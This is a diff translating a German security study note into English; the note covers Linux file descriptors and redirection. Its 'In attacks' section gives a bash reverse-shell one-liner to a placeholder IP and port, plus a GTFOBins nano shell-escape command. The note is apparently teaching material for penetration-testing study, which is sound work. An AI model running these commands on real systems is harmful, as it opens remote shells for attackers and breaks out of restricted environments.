@@ -1,38 +1,38 @@
 ---
 tags: [basics, linux]
-aliases: [File Descriptors, Streams, Redirects, Datei-Deskriptoren]
+aliases: [File Descriptors, Streams, Redirects]
 ---
 # File Descriptors & Redirects
 
-> Jeder Prozess hat drei Standard-Kanäle (Datei-Deskriptoren). Sie umzuleiten ist die Grundlage von Reverse-Shell-Payloads und Shell-Escapes.
+> Every process has three standard channels (file descriptors). Redirecting them is the basis of reverse-shell payloads and shell escapes.
 
-## Die drei Kanäle
-| Nr.   | Name   | Bedeutung                              | Default     |
-| ----- | ------ | -------------------------------------- | ----------- |
-| **0** | stdin  | Eingabe – was reinkommt                | Tastatur    |
-| **1** | stdout | normale Ausgabe – das Ergebnis         | Bildschirm  |
-| **2** | stderr | Fehlerausgabe – Fehler/Warnungen       | Bildschirm  |
+## The three channels
+| No.   | Name   | Meaning                           | Default    |
+| ----- | ------ | --------------------------------- | ---------- |
+| **0** | stdin  | input – what comes in             | keyboard   |
+| **1** | stdout | normal output – the result        | screen     |
+| **2** | stderr | error output – errors/warnings    | screen     |
 
-## Umleiten (`>`)
-`>` heißt „leite diesen Kanal woandershin". Die Zahl **davor** sagt, *welchen*:
-- `1>` → stdout umleiten (= nur `>`, weil 1 der Default ist)
-- `2>` → stderr umleiten
-- `>&` → stdout **und** stderr zusammen
-- `&1` / `&0` → „dorthin, wo Kanal 1 / 0 schon hinzeigt"
+## Redirecting (`>`)
+`>` means "send this channel somewhere else". The number **before it** says *which*:
+- `1>` → redirect stdout (= just `>`, since 1 is the default)
+- `2>` → redirect stderr
+- `>&` → stdout **and** stderr together
+- `&1` / `&0` → "to wherever channel 1 / 0 already points"
 
-| Ausdruck | Bedeutung                                              |
-| -------- | ------------------------------------------------------ |
-| `2>&1`   | stderr dorthin, wo stdout hinzeigt                     |
-| `>& /dev/tcp/<IP>/<PORT>` | stdout+stderr ins Netz (Reverse Shell)    |
-| `0>&1`   | stdin aus derselben Quelle wie stdout (Netz)           |
-| `1>&0 2>&0` | stdout+stderr aufs Terminal (stdin) zurück → interaktive Shell |
+| Expression | Meaning                                                 |
+| ---------- | ------------------------------------------------------- |
+| `2>&1`     | send stderr to wherever stdout points                   |
+| `>& /dev/tcp/<IP>/<PORT>` | stdout+stderr to the network (reverse shell) |
+| `0>&1`     | stdin from the same source as stdout (network)          |
+| `1>&0 2>&0` | stdout+stderr back to the terminal (stdin) → interactive shell |
 
-## In Angriffen
+## In attacks
 ```bash
-# Reverse Shell: alle drei Kanäle über die TCP-Verbindung
+# Reverse shell: all three channels over the TCP connection
 bash -i >& /dev/tcp/<IP>/4444 0>&1
 ```
 ```bash
-# nano/GTFOBins Shell-Escape (alles aufs Terminal)
+# nano/GTFOBins shell escape (everything to the terminal)
 reset; sh 1>&0 2>&0
 ```
